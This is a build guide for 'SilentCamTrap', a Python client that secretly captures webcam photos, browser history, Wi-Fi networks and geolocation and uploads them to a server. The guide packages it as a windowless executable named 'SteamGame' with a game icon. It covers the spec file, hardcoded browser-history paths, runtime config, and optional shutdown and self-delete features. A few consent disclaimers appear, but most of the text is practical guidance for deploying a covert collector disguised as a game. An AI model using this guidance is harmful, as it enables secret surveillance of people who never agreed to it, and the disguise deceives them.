# 🏗️ Build Guide

How to turn `python/client.py` into a standalone executable with PyInstaller.

> **Scope:** this guide documents what the repository actually does today. Where the
> build scripts and the code disagree, that is called out explicitly so you don't
> debug a phantom problem.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [The provided build scripts](#the-provided-build-scripts)
3. [Missing spec file: fix this first](#missing-spec-file-fix-this-first)
4. [Building without a spec file](#building-without-a-spec-file)
5. [Options explained](#options-explained)
6. [Runtime paths you must get right](#runtime-paths-you-must-get-right)
7. [Browser history paths](#browser-history-paths)
8. [Platform notes](#platform-notes)
9. [Troubleshooting](#troubleshooting)
10. [Verify the build](#verify-the-build)
11. [Distribution checklist](#distribution-checklist)

---

## Prerequisites

```bash
cd python
python -m venv .venv
# Windows: .venv\Scripts\activate      Linux/macOS: source .venv/bin/activate
pip install -r requirements.txt
```

`requirements.txt` already pins `pyinstaller>=6.0.0`, so a separate `pip install pyinstaller`
is not required inside this venv. Installing PyInstaller globally is what causes "the build
works in the terminal but not in CI" confusion — always build inside the same environment that
has the client's dependencies.

| Dependency | Needed for | If missing |
|------------|-----------|------------|
| `opencv-python` | webcam capture | hard import — client exits at start |
| `requests`, `geocoder` | upload + IP geolocation | hard import — client exits at start |
| `psutil` | battery, RAM/disk, uptime, process count | **optional by design**: wrapped in `try/except`, those fields are simply `null`/`0` |
| `pyinstaller` | packaging | cannot build |

`psutil` matters for packaging: if it is not installed in the **build** environment, the frozen
executable can never collect it, even if the target machine has it.

### Platform-specific toolchain

**Windows**
- Python 3.8+ 64-bit
- Microsoft Visual C++ Redistributable (needed by OpenCV at runtime)

**Linux (Debian/Ubuntu)**
```bash
sudo apt install -y python3-dev libv4l-dev
# OpenCV wheels also need these at runtime on slim images:
sudo apt install -y libgl1 libglib2.0-0
```

**macOS**
```bash
xcode-select --install
```

---

## The provided build scripts

| Script | What it runs | Output |
|--------|--------------|--------|
| `python/build.bat` (Windows) | `pip install -r requirements.txt`, delete `build/` + `dist/`, then `pyinstaller --clean silentcamtrap.spec` | `dist\SteamGame.exe` |
| `python/build.sh` (Linux/macOS) | same, via `pyinstaller --clean silentcamtrap.spec` | `dist/SteamGame` |

Both scripts print `Deploy dist/SteamGame + config.json to the target machine.` — that
pairing is required, see [Runtime paths](#runtime-paths-you-must-get-right).

`.github/workflows/build.yml` (the `v*`-tag release build) runs the identical
`pyinstaller --clean silentcamtrap.spec` command on `windows-latest` and then asserts that
`dist\SteamGame.exe` exists.

---

## Missing spec file: fix this first

⚠️ **`python/silentcamtrap.spec` is not tracked in this repository** — not in the working tree
and not anywhere in its git history. Until it exists, `build.bat`, `build.sh`, and the release
workflow all fail with `PyInstaller: silentcamtrap.spec does not exist`.

Save the following as `python/silentcamtrap.spec`. It is written for **PyInstaller 6.x** — the
older template floating around (with `block_cipher`, `win_no_prefer_redirects`,
`win_private_assemblies`) is rejected/ignored by 6.x and should not be reused.

```python
# -*- mode: python ; coding: utf-8 -*-
# SilentCamTrap — PyInstaller 6.x spec. Keep the name 'SteamGame' in sync with
# build.bat / build.sh / .github/workflows/build.yml, which all expect dist/SteamGame[.exe].

from PyInstaller.utils.hooks import collect_data_files, collect_dynamic_libs

datas = [('config.json', '.')]          # ships next to the exe; NOT auto-loaded (see below)
binaries = []

# OpenCV ships plugins/DLLs that static analysis misses.
datas += collect_data_files('cv2')
binaries += collect_dynamic_libs('cv2')

a = Analysis(
    ['client.py'],
    pathex=[],
    binaries=binaries,
    datas=datas,
    hiddenimports=['cv2', 'geocoder', 'requests', 'psutil'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['tkinter', 'matplotlib', 'PyQt5', 'PySide2'],
    noarchive=False,
    optimize=0,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='SteamGame',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,                 # set False if UPX is not installed / AV noise is a concern
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,            # windowed build; True keeps the terminal for debugging
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='game.ico',          # Windows .ico; drop this line on Linux/macOS
)
```

Then `build.bat` / `./build.sh` work as documented.

> The executable is named `SteamGame`. If you rebrand it, update **all four** places:
> this spec, `build.bat`, `build.sh`, and `build.yml`'s `Test-Path dist\SteamGame.exe` check.

---

## Building without a spec file

One-liner equivalents, useful for a quick local test:

**Windows (PowerShell, from `python\`):**
```powershell
pyinstaller --clean --onefile --windowed `
    --name SteamGame `
    --icon=game.ico `
    --add-data "config.json;." `
    --hidden-import cv2 --hidden-import geocoder --hidden-import requests --hidden-import psutil `
    client.py
```

**Linux / macOS (from `python/`):**
```bash
pyinstaller --clean --onefile --windowed \
    --name SteamGame \
    --add-data "config.json:." \
    --hidden-import cv2 --hidden-import geocoder --hidden-import requests --hidden-import psutil \
    client.py
chmod +x dist/SteamGame
```

Notes:
- `--add-data` uses `;` on Windows and `:` on Unix — swapping them is the most common build failure.
- `--onefile` unpacks to a temp directory on every run (slower start, extra disk churn);
  `--onedir` (the default if you omit `--onefile`) starts faster and is easier to sign and debug.
- `--windowed` and `--noconsole` are aliases. `--windowed` on macOS produces a `.app` bundle.
- To regenerate a spec from flags instead of hand-writing one:
  `pyi-makespec --onefile --windowed --name SteamGame --icon=game.ico client.py`

---

## Options explained

| Option | Description |
|--------|-------------|
| `--onefile` | Bundle everything into a single executable |
| `--onedir` | Folder output (default; faster startup) |
| `--windowed` / `--noconsole` | No console window; stdout/stderr are discarded |
| `--name SteamGame` | Executable name; must match the CI assertion |
| `--icon=game.ico` | Executable icon (Windows `.ico`; macOS uses `.icns`) |
| `--add-data "config.json;."` | Copies the file into the bundle — see the caveat below |
| `--hidden-import` | Force a module PyInstaller cannot infer (conditional imports, plugin loads) |
| `--collect-all cv2` | Alternative to manual `collect_data_files`/`collect_dynamic_libs` |
| `--exclude-module` | Shrink output by dropping modules you know are unused |
| `--upx-dir=PATH` | Enable UPX compression if the binary is not on `PATH` |
| `--key` | ❗ **Removed in PyInstaller 6.0** — bytecode encryption no longer exists; old docs referencing it are obsolete |
| `--debug=all` | Verbose bootloader output (use with a console build) |
| `--distpath` / `--workpath` / `--specpath` | Redirect `dist/`, `build/`, and spec location |
| `--clean` | Discard PyInstaller's cache before building |

---

## Runtime paths you must get right

The client resolves **both** of its files relative to the **current working directory**, not to
the executable:

- `Config.from_file()` → `config.json`
- `log_folder` → `<cwd>/intruder_logs/` (JPEG output + `client.log`)

Consequences:

1. Bundling `config.json` with `--add-data` does **not** make it load. `sys._MEIPASS` is never
   consulted, so a frozen build launched from `C:\Windows\System32` silently uses the built-in
   defaults (`api_url = http://localhost:3000/api/upload`) and reports success/nothing at all.
2. Ship `config.json` **next to the executable** and launch with that folder as the working
   directory — which is exactly what the `Deploy dist/SteamGame + config.json` instruction means:

   ```bat
   cd /d "C:\path\to\folder"
   SteamGame.exe
   ```

3. Double-clicking an exe in Explorer sets the working directory to the exe's folder, which is
   why "it works when I double-click but not as a scheduled task" happens. For a scheduled task
   or service, set "Start in" explicitly.
4. To make a bundled config work you must change the code, e.g.:

   ```python
   def _resource(name: str) -> str:
       base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
       return os.path.join(base, name)
   ```
   and pass `config_path=_resource('config.json')` to `Config.from_file()`.
5. Environment overrides (`SILENTCAMTRAP_API_URL`, `SILENTCAMTRAP_API_KEY`,
   `SILENTCAMTRAP_ENABLE_SHUTDOWN`, `SILENTCAMTRAP_ENABLE_DELETE`) are a convenient way to
   configure a frozen build without a file — see [README](../README.md#client-configuration-pythonconfigjson).

---

## Browser history paths

There is **no `chrome_path` / `firefox_path` option** in `Config`; `Config.from_file()` ignores
unknown keys, so adding them to `config.json` does nothing. The paths are hardcoded in
`BrowserHistoryCollector` per operating system:

| Browser | Windows | macOS | Linux |
|---------|---------|-------|-------|
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\History` | `~/Library/Application Support/Google/Chrome/Default/History` | `~/.config/google-chrome/Default/History` |
| Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History` | — | — |
| Firefox | `%APPDATA%\Mozilla\Firefox\profiles.ini` → `places.sqlite` | `~/Library/Application Support/Firefox/profiles.ini` | `~/.mozilla/firefox/profiles.ini` |

Behaviour worth knowing before you debug an empty result:

- Only the `Default` profile is used; Firefox falls back to the first `Profile*` section when
  nothing is marked `Default=1`. Chrome/Edge profiles named `Profile 1` are **not** read.
- The database is copied to a temp file first, so a running browser does not block collection;
  a locked or corrupted DB returns `{"error": "... database locked or corrupted ..."}` instead of data.
- Collection is per-browser and time-boxed (15 s overall). `{"info": "No history found"}` means
  the DB was readable but empty; `{"error": ...}` means it could not be read.
- The whole feature is switched by `enable_browser_history` and capped by `max_browser_history`.
- Firefox timestamps are microseconds since 1970-01-01 UTC; Chromium's are microseconds since
  1601-01-01 UTC. The dashboard renders them as captured, so treat the raw values accordingly.

Collecting history from a machine belonging to someone else requires that person's consent.
Use it on your own systems only.

---

## Platform notes

### Windows

- Antivirus and SmartScreen: PyInstaller one-file builds are frequently flagged because they
  self-extract and are unsigned. This is a packaging reality, not something to design around.
  The legitimate options are (a) sign with an Authenticode certificate,
  (b) distribute `--onedir` output or the source, and (c) tell your users to allow-list the
  folder. Do not ship to machines you do not own.
- `enable_shutdown` runs `shutdown /s /t 5`; it requires normal user privileges and will be
  logged by Windows. Off by default.
- Wi-Fi SSID and nearby-network collection shells out to `netsh wlan show interfaces`
  (and `... show networks mode=bssid`) with `CREATE_NO_WINDOW`. It needs the *WLAN AutoConfig*
  service and a wireless adapter, so desktop PCs without Wi-Fi legitimately report
  `wifi_ssid: null` and `nearby_networks: []`.

### Linux

- Webcam access needs membership of the `video` group:
  `sudo usermod -a -G video $USER` (re-login to apply). Verify with `ls /dev/video*`.
- `enable_shutdown` runs `shutdown -h +1`, which needs root or polkit permission; without it the
  call fails silently in a `Popen` — keep it off.
- Self-delete uses `sh` + `sleep 3` (`cleanup.sh`); it deletes only the script/exe path from
  `sys.executable`/`__file__`, not `intruder_logs/`.

### macOS

- Camera access is governed by TCC: the first capture prompts for permission; in a windowless
  build the prompt can be missed and `cv2.VideoCapture` simply returns no frames. Grant
  *Privacy & Security → Camera* to the terminal or the app, then re-run.
- Wi-Fi SSID lookup calls the legacy `airport` CLI
  (`/System/Library/PrivateFrameworks/Apple80211.framework/.../airport -I`), which Apple removed
  in macOS 14. Expect `wifi_ssid: null` on Sonoma and later — not a bug in your config.
- Optional signing: `codesign --force --deep --sign "Developer ID Application: Your Name" dist/SteamGame`
  (a `.app` bundle needs the signature before `--deep` notarization).

---

## Troubleshooting

### `silentcamtrap.spec does not exist`
The spec file is not in the repo — see [Missing spec file](#missing-spec-file-fix-this-first)
or build with the explicit flags in [Building without a spec file](#building-without-a-spec-file).

### `ModuleNotFoundError: No module named 'cv2'`
Built outside the venv that has `requirements.txt` installed:
```bash
pip install opencv-python
pyinstaller --clean --onefile --hidden-import cv2 client.py
```

### `ImportError: DLL load failed while importing cv2` (Windows)
Install the Microsoft Visual C++ Redistributable (2015–2022 x64). If it persists, build with
`--onedir` instead of `--onefile` to rule out temp-dir extraction issues.

### `ImportError: libGL.so.1: cannot open shared object file` (Linux)
```bash
sudo apt install -y libgl1 libglib2.0-0
```

### Executable runs and nothing happens
With `--windowed` there is no console, so read the log:
```bash
cat intruder_logs/client.log      # relative to the working directory you launched from
```
Look for `Failed to capture webcam image` (wrong `webcam_index`, or camera permission) and
`connection failed to http://...` (server unreachable, or `api_key` mismatch → HTTP 401).

### Dashboard shows nothing after a "successful" run
`api_key` in `config.json` must equal `API_KEY` in `server/.env`, and `api_url` must end in
`/api/upload`. A 401 is retried `send_retries` times and then logged as
`All 3 send attempts failed`.

### Webcam not found
Confirm the device, then try `webcam_index` values `0`, `1`, `2`. Linux: `ls /dev/video*`.

### Huge executable
`--onefile` + OpenCV is ~40–90 MB, mostly the bundled native libraries. Use
`--exclude-module=tkinter --exclude-module=matplotlib`, consider `--onedir`, and only add UPX if
you are prepared for extra AV false positives.

### Debug build
```bash
pyinstaller --clean --onefile --console --debug=all client.py
./dist/client
```
Keep the console for debugging — a `--windowed` build hides both prints and tracebacks.

---

## Verify the build

```bash
# 1. Server reachable (from the machine that will run the client)
curl http://localhost:3000/api/health

# 2. Run the executable from the folder that holds config.json
#    Windows
dist\SteamGame.exe
echo %ERRORLEVEL%          # 0 = captured and uploaded, 1 = failed

#    Linux/macOS
./dist/SteamGame; echo "exit=$?"

# 3. Confirm the artefacts and the entry
ls intruder_logs/           # intruder_<YYYYmmdd_HHMMSS>.jpg + client.log
```

Then open the dashboard (`/entries`) and check the new row, the image, and the
per-browser history columns.

---

## Distribution checklist

- [ ] `silentcamtrap.spec` exists (or the build used explicit flags) and the build completed
- [ ] `config.json` sits next to the executable **and** the working directory is that folder
- [ ] `api_url` uses HTTPS (or a private network) — uploads contain personal data
- [ ] `api_key` matches the server's `API_KEY`, and is not `default-api-key`
- [ ] Webcam capture verified on the target OS/architecture
- [ ] Entry visible in the dashboard, `client.log` free of errors
- [ ] `enable_shutdown` / `enable_self_delete` left **off** unless this is an isolated lab demo
- [ ] Written authorisation obtained for the machine and its users; notice/consent policy in place
- [ ] Retention and deletion process defined for the captured images

---

**Questions or bugs?** open an issue:
<https://github.com/mahmud-r-farhan/SilentCamTrap/issues>
